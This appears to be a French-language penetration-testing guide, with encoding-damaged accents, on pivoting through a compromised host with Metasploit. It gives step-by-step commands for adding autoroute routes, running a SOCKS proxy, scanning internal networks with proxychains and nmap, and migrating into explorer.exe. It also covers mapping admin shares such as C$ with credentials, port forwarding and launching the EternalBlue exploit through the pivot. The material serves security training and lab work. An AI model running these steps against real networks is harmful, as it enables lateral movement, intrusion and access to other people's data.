# üîÑ Pivoting avec Metasploit

[‚Üê Retour √† la table des mati√®res](../README.md)

## Concepts de base

Le pivoting permet d'acc√©der √† des r√©seaux internes via une machine compromise. Essentiel quand la cible finale n'est pas directement accessible depuis l'attaquant.

### Architecture typique
```
Attaquant ‚Üí Machine Compromise ‚Üí R√©seau Interne
           (Pivot Point)        (Cibles finales)
```

## Configuration du Pivoting

### √âtape 1 : Ajout de routes r√©seau

#### Avec autoroute (recommand√©)
```bash
# Depuis une session Meterpreter active
run autoroute -s 192.168.1.0/24
run autoroute -s 10.0.28.0/20

# V√©rification des routes ajout√©es
run autoroute -p
```

#### Avec le module route (alternatif)
```bash
# Mise en arri√®re-plan de la session
background

# Ajout manuel de route
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run
```

### √âtape 2 : Configuration du serveur SOCKS

#### V√©rification de la configuration proxychains
```bash
# V√©rifier le port configur√© dans proxychains
cat /etc/proxychains4.conf | grep socks
# Rechercher une ligne comme : socks4 127.0.0.1 9050
```

#### Lancement du serveur SOCKS4a
```bash
# Configuration du proxy Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050  # Port configur√© dans proxychains4.conf
set VERSION 4a
exploit

# V√©rification que le serveur fonctionne
jobs
```

### √âtape 3 : Utilisation via proxychains

#### Scan de d√©couverte
```bash
# Scan via le pivot (utiliser -sT pour la stabilit√©)
proxychains nmap target_interne -sT -Pn -sV -p 22,80,445

# Param√®tres recommand√©s :
# -sT : TCP connect scan (plus stable via proxy)
# -Pn : Skip host discovery (√©vite les timeouts)
# -sV : D√©tection de version
```

#### Outils via proxychains
```bash
# SMB via pivot
proxychains smbclient -L target_interne -N

# SSH via pivot
proxychains ssh user@target_interne

# HTTP via pivot
proxychains curl http://target_interne
```

## Techniques Avanc√©es

### Migration de processus pour acc√®s r√©seau

#### Probl√®me courant
Certains acc√®s r√©seau n√©cessitent un contexte utilisateur plut√¥t que SYSTEM.

#### Solution - Migration
```bash
# Lister les processus disponibles
ps

# Migration vers un processus utilisateur
migrate -N explorer.exe

# Ou migration par PID
migrate 1234
```

**Processus recommand√©s pour migration :**
- `explorer.exe` : Processus utilisateur principal
- `winlogon.exe` : Processus syst√®me stable
- `svchost.exe` : Services Windows

### Acc√®s aux ressources r√©seau Windows

#### Commandes net via pivot
```bash
# Depuis une session shell sur la machine compromise
shell

# D√©couverte des ressources partag√©es
net view target_interne

# Mappage de lecteurs r√©seau
net use Z: \\target_interne\C$
net use Y: \\target_interne\Documents

# Exploration des donn√©es
dir Z:
dir Y:
```

#### Gestion des credentials
```bash
# Utilisation de credentials sp√©cifiques
net use Z: \\target_interne\C$ /user:domain\username password

# Suppression de mappages
net use Z: /delete
```

## Port Forwarding

### Port forwarding local
```bash
# Redirection d'un port local vers la cible via pivot
use auxiliary/server/socks_proxy
# Ou utiliser portfwd dans meterpreter
portfwd add -l 8080 -p 80 -r target_interne
```

### Acc√®s direct apr√®s port forwarding
```bash
# Acc√®s direct via localhost
curl http://localhost:8080
# Redirig√© vers target_interne:80 via le pivot
```

## Modules Metasploit via Pivot

### Scanner des services via pivot
```bash
# Scanner SMB via les routes configur√©es
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Scanner SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

### Exploitation via pivot
```bash
# Exploitation directe via les routes Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_interne
exploit
# Utilise automatiquement les routes configur√©es
```

## Troubleshooting

### Probl√®mes courants

#### Timeouts via proxychains
```bash
# Augmenter les timeouts dans /etc/proxychains4.conf
tcp_read_time_out 15000
tcp_connect_time_out 8000
```

#### Sessions qui se ferment
```bash
# √âviter les scans agressifs
# Utiliser -sT au lieu de -sS
# R√©duire le nombre de threads : -T2
proxychains nmap target -sT -T2 -Pn
```

#### Probl√®mes de r√©solution DNS
```bash
# Utiliser les IPs directement
proxychains nmap 192.168.1.10 -sT -Pn

# Ou configurer DNS dans proxychains4.conf
proxy_dns
```

### V√©rification de la connectivit√©
```bash
# Test de base via proxychains
proxychains telnet target_interne 445

# Test avec timeout court
timeout 10 proxychains nmap target_interne -p 445
```

## Workflow Complet de Pivoting

### 1. Pr√©paration
```bash
# Obtenir une session Meterpreter sur la machine pivot
# Identifier les r√©seaux internes accessibles
```

### 2. Configuration
```bash
# Ajouter les routes n√©cessaires
run autoroute -s RESEAU_INTERNE/MASQUE

# Configurer le serveur SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
```

### 3. Reconnaissance
```bash
# Scanner les cibles internes
proxychains nmap RESEAU_INTERNE -sT -Pn --top-ports 100
```

### 4. Exploitation
```bash
# Utiliser les outils habituels via proxychains
# Ou exploiter directement via Metasploit avec les routes configur√©es
```

### 5. Acc√®s aux donn√©es
```bash
# Migration si n√©cessaire pour acc√®s r√©seau
migrate -N explorer.exe

# Acc√®s aux ressources partag√©es
net view target_interne
net use Z: \\target_interne\C$
```

## R√©f√©rences

- [Lab NetBIOS/SMB avec Pivoting](../lab/netbios-smb-lab.md)
- [√ânum√©ration SMB](../03-enumeration/smb-samba.md)
- [Post-exploitation Windows](windows-privesc.md)